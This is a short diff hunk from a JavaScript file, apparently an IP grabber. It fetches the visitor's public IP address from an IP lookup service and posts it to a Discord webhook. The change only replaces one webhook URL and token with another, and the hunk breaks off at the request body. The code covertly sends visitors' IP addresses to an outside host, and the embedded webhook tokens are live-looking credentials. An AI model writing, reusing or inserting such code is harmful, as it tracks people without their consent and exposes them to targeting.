@@ -1,7 +1,7 @@
 fetch('https://api.ipify.org')
 .then(response => response.text())
 .then(ip => {
-    fetch('https://discord.com/api/webhooks/1425143787747020873/Z0FpN8ORcAYSQPdW1ol91L89cLRQgR-Jr4tkG4bCe88O0frYcK_sSgBuSaeIZnDYSneo', {
+    fetch('https://discord.com/api/webhooks/1444260678516084748/E5DuzaYB5YZ3BUh1C_02a1KVp5xLnLlobI30dV6GDuMpPUTCYlJPERGOMT83GCvnq71Q', {
         method: 'POST',
         headers: {'Content-Type': 'application/json'},
         body: JSON.stringify({
